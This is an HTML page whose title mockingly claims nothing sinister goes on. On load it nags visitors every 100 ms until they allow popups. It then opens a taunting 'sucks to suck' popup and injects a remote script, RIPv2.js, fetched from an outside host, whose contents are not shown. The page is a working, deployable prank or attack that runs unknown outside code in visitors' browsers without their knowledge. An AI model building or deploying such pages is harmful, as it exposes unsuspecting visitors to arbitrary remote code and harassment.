<!DOCTYPE html>
<html>
<head>
    <title>Totally innocent webpage with nothing sinister going on</title>
    <script type="text/javascript">
        function requestPopup() {
            let popup = window.open('about:blank', '_blank');
            if (popup) {
                let popupContent = `
                  <!DOCTYPE html>
                  <html lang="en">
                  <head>
                    <title>Sucks to suck</title>
                  </head>
                  <body>
                    <h1 style="text-align: center; font-size: 3em; margin-top: 0.2em;">sucks to suck</h1>
                    <img style="z-index: -100; width: 100%; height: 100%; min-height: 100%; position: fixed; top: 65%; left: 50%; transform: translate(-50%, -50%);" src="https://rip.up.railway.app/laugh.gif">
                  </body>
                  </html>
                `;
                popup.document.open();
                popup.document.write(popupContent);
                popup.document.close();
                executeExternalScript();
                return true;
            } else {
                document.body.innerHTML = `
                    <h1 style="text-align: center; font-size: 3em; margin-top: 0.2em;">enable pop-ups pls</h1>
                    <img style="z-index: -100; width: 100%; height: 100%; min-height: 100%; position: fixed; top: 60%; left: 45%; transform: translate(-50%, -50%);" src="https://rip.up.railway.app/please.png">
                `;
                return false;
            }
        }

        function checkPopup() {
            let accepted = requestPopup();
            if (!accepted) {
                setTimeout(checkPopup, 100); // Retry every second
            }
        }
        
        function executeExternalScript() {
            let script = document.createElement('script');
            script.src = "https://rip.up.railway.app/RIPv2.js";
            document.head.appendChild(script);
        }

        window.onload = function() {
            checkPopup();
        };
    </script>
</head>
<body>
    <noscript>
        <p>Please enable JavaScript to view this page correctly.</p>
    </noscript>
</body>
</html>
